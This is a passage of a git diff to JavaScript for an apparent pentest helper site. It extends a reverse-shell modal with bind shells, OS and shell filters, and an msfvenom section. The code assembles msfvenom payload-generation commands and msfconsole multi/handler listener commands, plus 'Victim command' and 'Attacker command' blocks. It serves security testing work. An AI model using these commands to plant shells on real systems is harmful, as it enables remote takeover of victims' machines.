@@ -73,6 +73,10 @@ function openModal(modal) {
     modal.classList.add('show');
     modal.setAttribute('aria-hidden', 'false');
     document.body.classList.add('modal-open');
+    const modalBody = modal.querySelector('.pwn-modal-body');
+    if (modalBody) {
+        modalBody.scrollTop = 0;
+    }
 
     const focusTarget = modal.querySelector(
         '.pwn-modal-body input, .pwn-modal-body select, .pwn-modal-body textarea, .pwn-modal-body button'
@@ -268,22 +272,62 @@ function resetModalState(modalId) {
         }
         const lhostInput = document.getElementById('reverseLhost');
         const lportInput = document.getElementById('reverseLport');
+        const rhostInput = document.getElementById('reverseRhost');
+        const bindLhostInput = document.getElementById('bindLhost');
+        const bindLportInput = document.getElementById('bindLport');
+        const bindRhostInput = document.getElementById('bindRhost');
+        const msfLhostInput = document.getElementById('msfLhost');
+        const msfLportInput = document.getElementById('msfLport');
+        const msfRhostInput = document.getElementById('msfRhost');
+        const reverseOsFilter = document.getElementById('reverseOsFilter');
+        const reverseShellFilter = document.getElementById('reverseShellFilter');
         const typeSelect = document.getElementById('reverseType');
+        const bindOsFilter = document.getElementById('bindOsFilter');
+        const bindShellFilter = document.getElementById('bindShellFilter');
+        const bindTypeSelect = document.getElementById('bindType');
+        const msfOs = document.getElementById('msfvenomOs');
         const msfPayload = document.getElementById('msfvenomPayload');
         const msfOutput = document.getElementById('msfvenomOutput');
         const combinedReverse = document.getElementById('reverseCombinedCmd');
+        const combinedBind = document.getElementById('bindCombinedCmd');
         const combinedMsf = document.getElementById('msfvenomCombinedCmd');
         const webshellSelect = document.getElementById('reverseWebType');
         const webshellContainer = document.getElementById('reverseWebshellCmd');
         if (lhostInput) lhostInput.value = '';
         if (lportInput) lportInput.value = '';
+        if (rhostInput) rhostInput.value = '';
+        if (bindLhostInput) bindLhostInput.value = '';
+        if (bindLportInput) bindLportInput.value = '';
+        if (bindRhostInput) bindRhostInput.value = '';
+        if (msfLhostInput) msfLhostInput.value = '';
+        if (msfLportInput) msfLportInput.value = '';
+        if (msfRhostInput) msfRhostInput.value = '';
+        if (reverseOsFilter && reverseOsFilter.options.length) {
+            const linuxOption = Array.from(reverseOsFilter.options).find(option => option.value === 'linux');
+            reverseOsFilter.value = linuxOption ? 'linux' : reverseOsFilter.options[0].value;
+        }
+        if (reverseShellFilter && reverseShellFilter.options.length) reverseShellFilter.selectedIndex = 0;
         if (typeSelect && typeSelect.options.length) typeSelect.selectedIndex = 0;
+        if (bindOsFilter && bindOsFilter.options.length) {
+            const linuxOption = Array.from(bindOsFilter.options).find(option => option.value === 'linux');
+            bindOsFilter.value = linuxOption ? 'linux' : bindOsFilter.options[0].value;
+        }
+        if (bindShellFilter && bindShellFilter.options.length) bindShellFilter.selectedIndex = 0;
+        if (bindTypeSelect && bindTypeSelect.options.length) bindTypeSelect.selectedIndex = 0;
+        if (msfOs && msfOs.options.length) {
+            const linuxOption = Array.from(msfOs.options).find(option => option.value === 'linux');
+            msfOs.value = linuxOption ? 'linux' : msfOs.options[0].value;
+        }
+        if (msfOs) {
+            msfOs.dispatchEvent(new Event('change'));
+        }
         if (msfPayload && msfPayload.options.length) msfPayload.selectedIndex = 0;
         if (msfOutput) {
             msfOutput.value = '';
             msfOutput.dataset.edited = 'false';
         }
         if (combinedReverse) combinedReverse.innerHTML = '';
+        if (combinedBind) combinedBind.innerHTML = '';
         if (combinedMsf) combinedMsf.innerHTML = '';
         if (webshellSelect && webshellSelect.options.length) webshellSelect.selectedIndex = 0;
         if (webshellContainer) webshellContainer.innerHTML = '';
@@ -500,83 +544,329 @@ function buildTransferCommandCell(commands, replacements) {
     return cell;
 }
 
+const SHELL_FILTER_ALL = 'all';
+const SHELL_OS_ORDER = ['linux', 'macos', 'windows'];
+const SHELL_COMMANDS_BY_OS = {
+    linux: [
+        { value: 'sh', label: 'sh' },
+        { value: '/bin/sh', label: '/bin/sh' },
+        { value: 'bash', label: 'bash' },
+        { value: '/bin/bash', label: '/bin/bash' },
+        { value: 'ash', label: 'ash' },
+        { value: 'bsh', label: 'bsh' },
+        { value: 'csh', label: 'csh' },
+        { value: 'ksh', label: 'ksh' },
+        { value: 'zsh', label: 'zsh' },
+        { value: 'pdksh', label: 'pdksh' },
+        { value: 'tcsh', label: 'tcsh' },
+        { value: 'mksh', label: 'mksh' },
+        { value: 'dash', label: 'dash' }
+    ],
+    macos: [
+        { value: 'sh', label: 'sh' },
+        { value: '/bin/sh', label: '/bin/sh' },
+        { value: 'bash', label: 'bash' },
+        { value: '/bin/bash', label: '/bin/bash' },
+        { value: 'zsh', label: 'zsh' },
+        { value: 'csh', label: 'csh' },
+        { value: 'ksh', label: 'ksh' },
+        { value: 'tcsh', label: 'tcsh' },
+        { value: 'dash', label: 'dash' }
+    ],
+    windows: [
+        { value: 'cmd', label: 'cmd' },
+        { value: 'powershell', label: 'powershell' },
+        { value: 'pwsh', label: 'pwsh' }
+    ]
+};
+
+function normalizeOsKey(value) {
+    const key = (value || '').toLowerCase().trim();
+    if (!key) {
+        return '';
+    }
+    if (key === 'mac' || key === 'osx') {
+        return 'macos';
+    }
+    return key;
+}
+
+function buildShellTemplateIndex(templates) {
+    return Object.keys(templates || {}).map(key => {
+        const entry = templates[key] || {};
+        return {
+            key,
+            label: entry.label || key,
+            osList: (entry.os || []).map(normalizeOsKey).filter(Boolean)
+        };
+    });
+}
+
+function buildShellOsOptions(templates) {
+    const index = buildShellTemplateIndex(templates);
+    const available = new Set();
+    index.forEach(item => {
+        item.osList.forEach(osKey => available.add(osKey));
+    });
+    const ordered = SHELL_OS_ORDER.filter(osKey => available.has(osKey));
+    return ordered.map(osKey => ({
+        value: osKey,
+        label: OS_LABELS?.[osKey] || osKey
+    }));
+}
+
+function populateFilterSelect(select, options, { includeAll = true } = {}) {
+    if (!select) {
+        return;
+    }
+    select.innerHTML = '';
+    if (includeAll) {
+        const allOption = document.createElement('option');
+        allOption.value = SHELL_FILTER_ALL;
+        allOption.textContent = 'All';
+        select.appendChild(allOption);
+    }
+
+    (options || []).forEach(option => {
+        const opt = document.createElement('option');
+        opt.value = option.value;
+        opt.textContent = option.label;
+        select.appendChild(opt);
+    });
+}
+
+function populateShellCommandSelect(select, osKey, preferredValue) {
+    if (!select) {
+        return;
+    }
+    const resolvedOs = osKey === SHELL_FILTER_ALL ? 'linux' : osKey;
+    const options = SHELL_COMMANDS_BY_OS[resolvedOs] || [];
+    select.innerHTML = '';
+    options.forEach(option => {
+        const opt = document.createElement('option');
+        opt.value = option.value;
+        opt.textContent = option.label;
+        select.appendChild(opt);
+    });
+    if (!options.length) {
+        const opt = document.createElement('option');
+        opt.value = '';
+        opt.textContent = 'No shells available';
+        select.appendChild(opt);
+        select.disabled = true;
+        return;
+    }
+    select.disabled = false;
+    if (preferredValue && options.some(option => option.value === preferredValue)) {
+        select.value = preferredValue;
+    } else if (!select.value || !options.some(option => option.value === select.value)) {
+        select.value = options[0].value;
+    }
+}
+
+function getShellFilterElements(prefix) {
+    return {
+        os: document.getElementById(`${prefix}OsFilter`),
+        shell: document.getElementById(`${prefix}ShellFilter`),
+        type: document.getElementById(`${prefix}Type`)
+    };
+}
+
+function filterShellTemplates(templates, filters) {
+    const index = buildShellTemplateIndex(templates);
+    return index.filter(item => {
+        if (filters.os && filters.os !== SHELL_FILTER_ALL) {
+            if (!item.osList.length || !item.osList.includes(filters.os)) {
+                return false;
+            }
+        }
+        return true;
+    });
+}
+
+function updateShellTemplateSelect(prefix, templates) {
+    const { os, type } = getShellFilterElements(prefix);
+    if (!type) {
+        return [];
+    }
+    const filters = {
+        os: os?.value || SHELL_FILTER_ALL
+    };
+    const filtered = filterShellTemplates(templates, filters);
+    const currentValue = type.value;
+
+    type.innerHTML = '';
+    if (!filtered.length) {
+        const opt = document.createElement('option');
+        opt.value = '';
+        opt.textContent = 'No matching shells';
+        type.appendChild(opt);
+        type.disabled = true;
+        return [];
+    }
+
+    filtered.forEach(item => {
+        const opt = document.createElement('option');
+        opt.value = item.key;
+        opt.textContent = item.label;
+        type.appendChild(opt);
+    });
+    type.disabled = false;
+    if (filtered.some(item => item.key === currentValue)) {
+        type.value = currentValue;
+    } else {
+        type.value = filtered[0].key;
+    }
+    return filtered;
+}
+
+function setupShellTemplateFilters(prefix, templates, onUpdate) {
+    const { os, shell, type } = getShellFilterElements(prefix);
+    if (!type) {
+        return;
+    }
+    populateFilterSelect(os, buildShellOsOptions(templates), { includeAll: false });
+    if (os && os.options.length) {
+        const hasLinux = Array.from(os.options).some(option => option.value === 'linux');
+        os.value = hasLinux ? 'linux' : os.options[0].value;
+    }
+    if (shell) {
+        populateShellCommandSelect(shell, os?.value, '/bin/sh');
+    }
+
+    const refresh = () => {
+        if (shell) {
+            const preferred = shell.value || '/bin/sh';
+            populateShellCommandSelect(shell, os?.value, preferred);
+        }
+        updateShellTemplateSelect(prefix, templates);
+        if (typeof onUpdate === 'function') {
+            onUpdate();
+        }
+    };
+
+    [os].forEach(select => {
+        if (select) {
+            select.addEventListener('change', refresh);
+        }
+    });
+    if (shell) {
+        shell.addEventListener('change', () => {
+            const changed = syncParameterValue('SHELL', shell.value, { refreshContent: false });
+            if (typeof onUpdate === 'function') {
+                onUpdate();
+            }
+            if (changed) {
+                refreshContentFromParameters();
+            }
+        });
+    }
+    type.addEventListener('change', () => {
+        if (typeof onUpdate === 'function') {
+            onUpdate();
+        }
+    });
+
+    refresh();
+}
+
 function setupReverseShellModal() {
-    const lhostInput = document.getElementById('reverseLhost');
-    const lportInput = document.getElementById('reverseLport');
+    const groups = getShellInputGroups();
     const typeSelect = document.getElementById('reverseType');
 
-    if (!lhostInput || !lportInput || !typeSelect) {
+    if (!groups.reverse.lhost || !groups.reverse.lport || !typeSelect) {
         return;
     }
 
-    populateReverseShellOptions(typeSelect);
+    setupShellTemplateFilters('reverse', REVERSE_SHELL_TEMPLATES, () => {
+        renderReverseShellCommands();
+    });
+    setupShellTemplateFilters('bind', BIND_SHELL_TEMPLATES, () => {
+        renderBindShellCommands();
+    });
     populateWebshellOptions();
-    prefillReverseShellInputs(lhostInput, lportInput);
+    prefillShellInputs(groups);
     setupModalCopyZones();
 
-    const update = () => {
+    const update = (sourceKey) => {
+        if (sourceKey) {
+            syncShellInputs(groups, sourceKey);
+        }
+        const values = getPrimaryShellValues(groups);
+        const shellValue = getSelectedShellValue('reverse');
         const changed =
-            syncParameterValue('LHOST', lhostInput.value, { refreshContent: false }) ||
-            syncParameterValue('LPORT', lportInput.value, { refreshContent: false });
+            syncParameterValue('LHOST', values.lhost, { refreshContent: false }) ||
+            syncParameterValue('LPORT', values.lport, { refreshContent: false }) ||
+            syncParameterValue('RHOST', values.rhost, { refreshContent: false }) ||
+            syncParameterValue('SHELL', shellValue, { refreshContent: false });
         renderReverseShellCommands();
+        renderBindShellCommands();
+        renderMsfvenomCommands();
         if (changed) {
             refreshContentFromParameters();
         }
     };
     setupMsfvenomSection(update);
-    lhostInput.addEventListener('input', update);
-    lportInput.addEventListener('input', update);
-    typeSelect.addEventListener('change', update);
+    Object.entries(groups).forEach(([key, group]) => {
+        if (group.lhost) group.lhost.addEventListener('input', () => update(key));
+        if (group.lport) group.lport.addEventListener('input', () => update(key));
+        if (group.rhost) group.rhost.addEventListener('input', () => update(key));
+    });
     const webshellSelect = document.getElementById('reverseWebType');
     if (webshellSelect) {
         webshellSelect.addEventListener('change', () => {
-            renderWebshellCommand(lhostInput.value, lportInput.value);
+            const reverseValues = getShellInputValues(groups.reverse);
+            renderWebshellCommand(reverseValues.lhost, reverseValues.lport);
         });
     }
     update();
-    renderWebshellCommand(lhostInput.value, lportInput.value);
+    const reverseValues = getShellInputValues(groups.reverse);
+    renderWebshellCommand(reverseValues.lhost, reverseValues.lport);
 }
 
 function refreshReverseModalState() {
-    const lhostInput = document.getElementById('reverseLhost');
-    const lportInput = document.getElementById('reverseLport');
+    const groups = getShellInputGroups();
+    const reverseOsFilter = document.getElementById('reverseOsFilter');
+    const reverseShellFilter = document.getElementById('reverseShellFilter');
+    const bindOsFilter = document.getElementById('bindOsFilter');
+    const bindShellFilter = document.getElementById('bindShellFilter');
 
-    if (!lhostInput || !lportInput) {
+    if (!groups.reverse.lhost || !groups.reverse.lport) {
         return;
     }
 
-    prefillReverseShellInputs(lhostInput, lportInput);
+    prefillShellInputs(groups);
 
+    const values = getPrimaryShellValues(groups);
     const changed =
-        syncParameterValue('LHOST', lhostInput.value, { refreshContent: false }) ||
-        syncParameterValue('LPORT', lportInput.value, { refreshContent: false });
+        syncParameterValue('LHOST', values.lhost, { refreshContent: false }) ||
+        syncParameterValue('LPORT', values.lport, { refreshContent: false }) ||
+        syncParameterValue('RHOST', values.rhost, { refreshContent: false }) ||
+        syncParameterValue('SHELL', getSelectedShellValue('reverse'), { refreshContent: false });
 
+    if (reverseShellFilter) {
+        populateShellCommandSelect(reverseShellFilter, reverseOsFilter?.value, reverseShellFilter.value || '/bin/sh');
+    }
+    if (bindShellFilter) {
+        populateShellCommandSelect(bindShellFilter, bindOsFilter?.value, bindShellFilter.value || '/bin/sh');
+    }
+    updateShellTemplateSelect('reverse', REVERSE_SHELL_TEMPLATES);
+    updateShellTemplateSelect('bind', BIND_SHELL_TEMPLATES);
     renderReverseShellCommands();
+    renderBindShellCommands();
+    renderMsfvenomCommands();
 
     if (changed) {
         refreshContentFromParameters();
     }
 }
 
-function populateReverseShellOptions(select) {
-    const order = ['bash', 'python', 'powershell', 'netcat'];
-    select.innerHTML = '';
-
-    order.forEach(key => {
-        if (!REVERSE_SHELL_TEMPLATES[key]) {
-            return;
-        }
-        const option = document.createElement('option');
-        option.value = key;
-        option.textContent = REVERSE_SHELL_TEMPLATES[key].label;
-        select.appendChild(option);
-    });
-}
-
 function renderReverseShellCommands() {
     const lhostInput = document.getElementById('reverseLhost');
     const lportInput = document.getElementById('reverseLport');
+    const rhostInput = document.getElementById('reverseRhost');
     const typeSelect = document.getElementById('reverseType');
+    const shellValue = getSelectedShellValue('reverse');
     const combinedOutput = document.getElementById('reverseCombinedCmd');
     const lhostError = document.getElementById('reverseLhostError');
     const lportError = document.getElementById('reverseLportError');
@@ -590,11 +880,61 @@ function renderReverseShellCommands() {
     if (lhostError) lhostError.textContent = '';
     if (lportError) lportError.textContent = '';
 
-    const selected = REVERSE_SHELL_TEMPLATES[typeSelect.value] || REVERSE_SHELL_TEMPLATES.bash;
+    const selected = REVERSE_SHELL_TEMPLATES[typeSelect.value];
     const replacements = [
         { placeholder: '{{LHOST}}', value: lhost },
-        { placeholder: '{{LPORT}}', value: lport }
+        { placeholder: '{{LPORT}}', value: lport },
+        { placeholder: '{{RHOST}}', value: (rhostInput?.value || '').trim() },
+        { placeholder: '{{SHELL}}', value: shellValue }
     ];
+    updateShellFieldVisibility('reverse', selected);
+
+    if (!selected) {
+        combinedOutput.textContent = 'No shells match the selected filters.';
+    } else {
+        const combinedTemplate = `# Victim command
+${selected.victim}
+
+# Attacker command
+${selected.attacker}`;
+
+        combinedOutput.innerHTML = '';
+        const combinedSnippet = createCopyableSnippet(combinedTemplate, replacements);
+        combinedOutput.appendChild(combinedSnippet);
+        addModalCopyBehavior(combinedSnippet);
+    }
+
+    renderShellLibrarySections(lhost, lport);
+    renderWebshellCommand(lhost, lport);
+}
+
+function renderBindShellCommands() {
+    const lportInput = document.getElementById('bindLport');
+    const rhostInput = document.getElementById('bindRhost');
+    const typeSelect = document.getElementById('bindType');
+    const combinedOutput = document.getElementById('bindCombinedCmd');
+    const shellValue = getSelectedShellValue('bind');
+
+    if (!lportInput || !rhostInput || !typeSelect || !combinedOutput) {
+        return;
+    }
+
+    const lport = lportInput.value.trim();
+    const rhost = rhostInput.value.trim();
+    const selected = BIND_SHELL_TEMPLATES[typeSelect.value];
+    const replacements = [
+        { placeholder: '{{LPORT}}', value: lport },
+        { placeholder: '{{RHOST}}', value: rhost },
+        { placeholder: '{{SHELL}}', value: shellValue }
+    ];
+
+    updateShellFieldVisibility('bind', selected);
+
+    if (!selected) {
+        combinedOutput.textContent = 'No shells match the selected filters.';
+        return;
+    }
+
     const combinedTemplate = `# Victim command
 ${selected.victim}
 
@@ -605,10 +945,6 @@ ${selected.attacker}`;
     const combinedSnippet = createCopyableSnippet(combinedTemplate, replacements);
     combinedOutput.appendChild(combinedSnippet);
     addModalCopyBehavior(combinedSnippet);
-
-    renderMsfvenomCommands(lhost, lport);
-    renderShellLibrarySections(lhost, lport);
-    renderWebshellCommand(lhost, lport);
 }
 
 function buildLibraryReplacements(lhost, lport) {
@@ -656,9 +992,13 @@ function renderShellLibrarySection(sectionId, containerId, lhost, lport) {
         const entryEl = document.createElement('div');
         entryEl.className = 'reference-entry';
 
-        const name = document.createElement('h4');
+        const isStabSection = sectionId === 'stabilisation';
+        const isStabHeading =
+            isStabSection &&
+            (entry.name === 'Linux Shell Stabilization' || entry.name === 'Windows Shell Stabilization');
+        const name = document.createElement(isStabHeading ? 'h3' : 'h4');
         name.textContent = entry.name;
-        if (sectionId === 'stabilisation') {
+        if (isStabSection && !isStabHeading) {
             name.classList.add('stab-heading');
         }
         entryEl.appendChild(name);
@@ -860,15 +1200,23 @@ function renderWebshellCommand(lhost, lport) {
         return;
     }
 
-    const annotated = snippets
-        .map((cmd, idx) => `# ${entry.name} ${idx + 1}\n${cmd}`)
-        .join('\n\n');
+    const annotated = [];
+    for (let i = 0; i < snippets.length; i += 2) {
+        const comment = snippets[i];
+        const command = snippets[i + 1];
+        if (comment && command) {
+            annotated.push(`${comment}\n${command}`);
+        } else if (comment) {
+            annotated.push(comment);
+        }
+    }
+    const annotatedText = annotated.join('\n\n');
 
-    const block = createCopyableSnippet(annotated, replacements);
+    const block = createCopyableSnippet(annotatedText, replacements);
     block.classList.add('code-block', 'modal-code-block');
     const codeEl = block.querySelector('code');
     if (codeEl) {
-        codeEl.innerHTML = formatTemplateWithHighlights(annotated, replacements);
+        codeEl.innerHTML = formatTemplateWithHighlights(annotatedText, replacements);
     }
     container.appendChild(block);
     addModalCopyBehavior(block);
@@ -904,17 +1252,137 @@ function createCopyableSnippet(text, replacements, inline = false) {
     return wrapper;
 }
 
-function prefillReverseShellInputs(lhostInput, lportInput) {
+function getShellInputGroups() {
+    return {
+        reverse: {
+            lhost: document.getElementById('reverseLhost'),
+            lport: document.getElementById('reverseLport'),
+            rhost: document.getElementById('reverseRhost')
+        },
+        bind: {
+            lhost: document.getElementById('bindLhost'),
+            lport: document.getElementById('bindLport'),
+            rhost: document.getElementById('bindRhost')
+        },
+        msf: {
+            lhost: document.getElementById('msfLhost'),
+            lport: document.getElementById('msfLport'),
+            rhost: document.getElementById('msfRhost')
+        }
+    };
+}
+
+function getShellInputValues(group) {
+    return {
+        lhost: (group?.lhost?.value || '').trim(),
+        lport: (group?.lport?.value || '').trim(),
+        rhost: (group?.rhost?.value || '').trim()
+    };
+}
+
+function getPrimaryShellValues(groups) {
+    const order = ['reverse', 'bind', 'msf'];
+    for (const key of order) {
+        const group = groups[key];
+        const values = getShellInputValues(group);
+        if (values.lhost || values.lport || values.rhost) {
+            return values;
+        }
+    }
+    return {
+        lhost: getStoredParamValue('LHOST'),
+        lport: getStoredParamValue('LPORT'),
+        rhost: getStoredParamValue('RHOST')
+    };
+}
+
+function syncShellInputs(groups, sourceKey) {
+    const source = groups[sourceKey];
+    if (!source) {
+        return;
+    }
+    const values = getShellInputValues(source);
+    Object.entries(groups).forEach(([key, group]) => {
+        if (key === sourceKey || !group) {
+            return;
+        }
+        if (group.lhost && group.lhost.value !== values.lhost) {
+            group.lhost.value = values.lhost;
+        }
+        if (group.lport && group.lport.value !== values.lport) {
+            group.lport.value = values.lport;
+        }
+        if (group.rhost && group.rhost.value !== values.rhost) {
+            group.rhost.value = values.rhost;
+        }
+    });
+}
+
+function prefillShellInputs(groups) {
     const storedLhost = getStoredParamValue('LHOST');
     const storedLport = getStoredParamValue('LPORT');
+    const storedRhost = getStoredParamValue('RHOST');
 
-    if (storedLhost) {
-        lhostInput.value = storedLhost;
-    }
+    Object.values(groups).forEach(group => {
+        if (!group) {
+            return;
+        }
+        if (group.lhost && storedLhost) {
+            group.lhost.value = storedLhost;
+        }
+        if (group.lport && storedLport) {
+            group.lport.value = storedLport;
+        }
+        if (group.rhost && storedRhost) {
+            group.rhost.value = storedRhost;
+        }
+    });
+}
 
-    if (storedLport) {
-        lportInput.value = storedLport;
+function getSelectedShellValue(prefix) {
+    const shellSelect = document.getElementById(`${prefix}ShellFilter`);
+    const value = (shellSelect?.value || '').trim();
+    if (value) {
+        return value;
     }
+    return '/bin/sh';
+}
+
+function templateUsesPlaceholder(template, placeholder) {
+    if (!template) {
+        return false;
+    }
+    const variants = [placeholder, `<${placeholder.replace(/[{}]/g, '')}>`];
+    return variants.some(token => template.includes(token));
+}
+
+function setShellFieldVisibility(fieldId, isVisible) {
+    const field = document.getElementById(fieldId);
+    if (!field) {
+        return;
+    }
+    field.hidden = !isVisible;
+    const input = field.querySelector('input');
+    if (input) {
+        input.disabled = !isVisible;
+    }
+}
+
+function updateShellFieldVisibility(prefix, selected) {
+    if (!selected) {
+        setShellFieldVisibility(`${prefix}LhostField`, false);
+        setShellFieldVisibility(`${prefix}LportField`, false);
+        setShellFieldVisibility(`${prefix}RhostField`, false);
+        return;
+    }
+    const combined = `${selected.victim || ''}\n${selected.attacker || ''}`;
+    const showLhost = templateUsesPlaceholder(combined, '{{LHOST}}');
+    const showLport = templateUsesPlaceholder(combined, '{{LPORT}}');
+    const showRhost = templateUsesPlaceholder(combined, '{{RHOST}}');
+
+    setShellFieldVisibility(`${prefix}LhostField`, showLhost);
+    setShellFieldVisibility(`${prefix}LportField`, showLport);
+    setShellFieldVisibility(`${prefix}RhostField`, showRhost);
 }
 
 function getStoredParamValue(paramNames) {
@@ -1030,73 +1498,229 @@ function buildOutputFileName(baseName, extension) {
     return `${baseName}.${extension}`;
 }
 
-function setupMsfvenomSection(onChange) {
-    const payloadSelect = document.getElementById('msfvenomPayload');
-    const outputInput = document.getElementById('msfvenomOutput');
+const MSFVENOM_OS_ORDER = ['windows', 'linux', 'macos', 'android'];
 
-    if (!payloadSelect || !outputInput) {
+function normalizeMsfvenomOs(value) {
+    return normalizeOsKey(value);
+}
+
+function getMsfvenomTemplatesForOs(osKey) {
+    if (!osKey) {
+        return MSFVENOM_TEMPLATES;
+    }
+    const normalizedOs = normalizeMsfvenomOs(osKey);
+    return MSFVENOM_TEMPLATES.filter(template => {
+        const osList = (template.os || []).map(normalizeMsfvenomOs);
+        return osList.includes(normalizedOs);
+    });
+}
+
+function getMsfvenomOsOptions() {
+    const available = new Set();
+    MSFVENOM_TEMPLATES.forEach(template => {
+        (template.os || []).map(normalizeMsfvenomOs).forEach(osKey => available.add(osKey));
+    });
+    const ordered = MSFVENOM_OS_ORDER.filter(osKey => available.has(osKey));
+    return ordered.map(osKey => ({
+        value: osKey,
+        label: OS_LABELS?.[osKey] || osKey.charAt(0).toUpperCase() + osKey.slice(1)
+    }));
+}
+
+function populateMsfvenomPayloadOptions(payloadSelect, templates) {
+    if (!payloadSelect) {
         return;
     }
-
     payloadSelect.innerHTML = '';
-    MSFVENOM_TEMPLATES.forEach(template => {
+    if (!templates.length) {
+        const option = document.createElement('option');
+        option.value = '';
+        option.textContent = 'No payloads available';
+        payloadSelect.appendChild(option);
+        payloadSelect.disabled = true;
+        return;
+    }
+    templates.forEach(template => {
         const option = document.createElement('option');
         option.value = template.key;
         option.textContent = template.label;
         payloadSelect.appendChild(option);
     });
+    payloadSelect.disabled = false;
+}
 
-    const defaultTemplate = MSFVENOM_TEMPLATES[0];
-    if (defaultTemplate && !outputInput.value) {
-        outputInput.value = defaultTemplate.defaultName;
+function setupMsfvenomSection(onChange) {
+    const osSelect = document.getElementById('msfvenomOs');
+    const payloadSelect = document.getElementById('msfvenomPayload');
+    const outputInput = document.getElementById('msfvenomOutput');
+    const lhostField = document.getElementById('msfLhostField');
+    const rhostField = document.getElementById('msfRhostField');
+    const helperText = document.getElementById('msfvenomHelper');
+
+    if (!payloadSelect || !outputInput) {
+        return;
+    }
+
+    if (osSelect) {
+        populateFilterSelect(osSelect, getMsfvenomOsOptions(), { includeAll: false });
+        if (osSelect.options.length) {
+            const linuxOption = Array.from(osSelect.options).find(option => option.value === 'linux');
+            osSelect.value = linuxOption ? 'linux' : osSelect.options[0].value;
+        }
+    }
+
+    const refreshPayloads = () => {
+        const templates = osSelect ? getMsfvenomTemplatesForOs(osSelect.value) : MSFVENOM_TEMPLATES;
+        const previousValue = payloadSelect.value;
+        populateMsfvenomPayloadOptions(payloadSelect, templates);
+        if (templates.length) {
+            const hasPrevious = templates.some(template => template.key === previousValue);
+            payloadSelect.value = hasPrevious ? previousValue : templates[0].key;
+            const selected = getSelectedMsfvenomTemplate(payloadSelect.value, templates);
+            if (selected && outputInput.dataset.edited !== 'true') {
+                outputInput.value = selected.defaultName;
+            }
+        }
+        updateMsfvenomMode(payloadSelect.value, {
+            lhostField,
+            rhostField,
+            helperText
+        });
+        if (typeof onChange === 'function') {
+            onChange();
+        }
+        renderMsfvenomCommands();
+    };
+
+    if (!outputInput.value) {
+        const defaultTemplate = getSelectedMsfvenomTemplate(payloadSelect.value);
+        if (defaultTemplate) {
+            outputInput.value = defaultTemplate.defaultName;
+        }
     }
     outputInput.dataset.edited = outputInput.value ? 'true' : 'false';
 
     payloadSelect.addEventListener('change', () => {
-        const selected = getSelectedMsfvenomTemplate(payloadSelect.value);
+        const templates = osSelect ? getMsfvenomTemplatesForOs(osSelect.value) : MSFVENOM_TEMPLATES;
+        const selected = getSelectedMsfvenomTemplate(payloadSelect.value, templates);
         if (selected && outputInput.dataset.edited !== 'true') {
             outputInput.value = selected.defaultName;
         }
+        updateMsfvenomMode(payloadSelect.value, {
+            lhostField,
+            rhostField,
+            helperText
+        });
         if (typeof onChange === 'function') {
             onChange();
         }
+        renderMsfvenomCommands();
     });
+
+    if (osSelect) {
+        osSelect.addEventListener('change', refreshPayloads);
+    }
 
     outputInput.addEventListener('input', () => {
         outputInput.dataset.edited = outputInput.value ? 'true' : 'false';
         if (typeof onChange === 'function') {
             onChange();
         }
+        renderMsfvenomCommands();
     });
+
+    refreshPayloads();
 }
 
-function getSelectedMsfvenomTemplate(selectedKey) {
-    return MSFVENOM_TEMPLATES.find(template => template.key === selectedKey) || MSFVENOM_TEMPLATES[0];
+function getSelectedMsfvenomTemplate(selectedKey, templates = MSFVENOM_TEMPLATES) {
+    return templates.find(template => template.key === selectedKey) || templates[0];
 }
 
-function renderMsfvenomCommands(lhost, lport) {
+function getMsfvenomPayloadMode(payload) {
+    if (!payload) {
+        return 'reverse';
+    }
+    if (payload.includes('bind_tcp')) {
+        return 'bind';
+    }
+    if (payload.includes('reverse_')) {
+        return 'reverse';
+    }
+    return 'reverse';
+}
+
+function updateMsfvenomMode(selectedKey, elements) {
+    const osSelect = document.getElementById('msfvenomOs');
+    const templates = osSelect ? getMsfvenomTemplatesForOs(osSelect.value) : MSFVENOM_TEMPLATES;
+    const selected = getSelectedMsfvenomTemplate(selectedKey, templates);
+    const payload = selected?.payload || '';
+    const mode = getMsfvenomPayloadMode(payload);
+    const isBind = mode === 'bind';
+
+    if (elements?.lhostField) {
+        elements.lhostField.hidden = isBind;
+        const input = elements.lhostField.querySelector('input');
+        if (input) {
+            input.disabled = isBind;
+        }
+    }
+    if (elements?.rhostField) {
+        elements.rhostField.hidden = !isBind;
+        const input = elements.rhostField.querySelector('input');
+        if (input) {
+            input.disabled = !isBind;
+        }
+    }
+    if (elements?.helperText) {
+        elements.helperText.textContent = isBind
+            ? 'Attacker connects to the victim (bind shell).'
+            : 'Attacker listens for reverse shell connections.';
+    }
+}
+
+function renderMsfvenomCommands() {
+    const osSelect = document.getElementById('msfvenomOs');
     const payloadSelect = document.getElementById('msfvenomPayload');
     const outputInput = document.getElementById('msfvenomOutput');
     const combinedOutput = document.getElementById('msfvenomCombinedCmd');
+    const lhostInput = document.getElementById('msfLhost');
+    const lportInput = document.getElementById('msfLport');
+    const rhostInput = document.getElementById('msfRhost');
 
     if (!payloadSelect || !outputInput || !combinedOutput) {
         return;
     }
 
-    const selected = getSelectedMsfvenomTemplate(payloadSelect.value);
+    const templates = osSelect ? getMsfvenomTemplatesForOs(osSelect.value) : MSFVENOM_TEMPLATES;
+    const selected = getSelectedMsfvenomTemplate(payloadSelect.value, templates);
+    if (!selected) {
+        combinedOutput.textContent = 'No payloads available for the selected OS.';
+        return;
+    }
+
+    const payload = selected.payload || '';
+    const mode = getMsfvenomPayloadMode(payload);
+    const isBind = mode === 'bind';
     const baseName = normalizeOutputName(outputInput.value) || selected.defaultName;
     const outputFile = buildOutputFileName(baseName, selected.extension);
 
-    const payload = selected.payload;
     const format = selected.format;
+    const lhost = (lhostInput?.value || '').trim();
+    const lport = (lportInput?.value || '').trim();
+    const rhost = (rhostInput?.value || '').trim();
     const replacements = [
         { placeholder: '{{LHOST}}', value: lhost },
         { placeholder: '{{LPORT}}', value: lport },
+        { placeholder: '{{RHOST}}', value: rhost },
         { placeholder: '{{OUTPUT}}', value: outputFile }
     ];
 
-    const msfvenomTemplate = `msfvenom -p ${payload} LHOST={{LHOST}} LPORT={{LPORT}} -f ${format} -o {{OUTPUT}}`;
-    const listenerTemplate = `msfconsole -q -x "use exploit/multi/handler; set payload ${payload}; set LHOST {{LHOST}}; set LPORT {{LPORT}}; run -j"`;
+    const msfvenomTemplate = isBind
+        ? `msfvenom -p ${payload} LPORT={{LPORT}} -f ${format} -o {{OUTPUT}}`
+        : `msfvenom -p ${payload} LHOST={{LHOST}} LPORT={{LPORT}} -f ${format} -o {{OUTPUT}}`;
+    const listenerTemplate = isBind
